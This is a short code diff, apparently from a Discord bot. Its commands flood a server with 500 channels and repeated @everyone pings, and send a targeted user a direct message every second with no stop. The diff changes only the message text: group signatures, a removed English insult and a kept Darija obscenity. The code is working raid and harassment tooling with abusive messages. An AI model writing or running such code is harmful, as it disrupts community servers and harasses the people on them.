@@ -61,7 +61,7 @@ client.on('message' , async (message) => {
     if (message.content.startsWith('monster attack')) {
 for (let i = 0; i < 500; i++) {
         message.guild.createChannel(' Dating Team ', 'text')
-        message.channel.send('@everyone __** ya wlad l97ab 9alabto 3lia ana 7witkom By Floki ...  **__ :muscle: :v: @here');
+        message.channel.send('@everyone __** ya wlad l97ab 9alabto 3lia ana 7witkom by Atlantic  ...  **__ :muscle: :v: @here');
 }
 }
 });   
@@ -93,7 +93,7 @@ client.on('message' , async (message) => {
  if (message.content.startsWith('*dm')) {
     setInterval(function() {
         let user = message.mentions.users.first() || message.author;
-            user.send('hey you ugly as fuck welcome to our server')
+            user.send('salam atlantic gang is back by Floki')
     }, 1000)
  }
 });
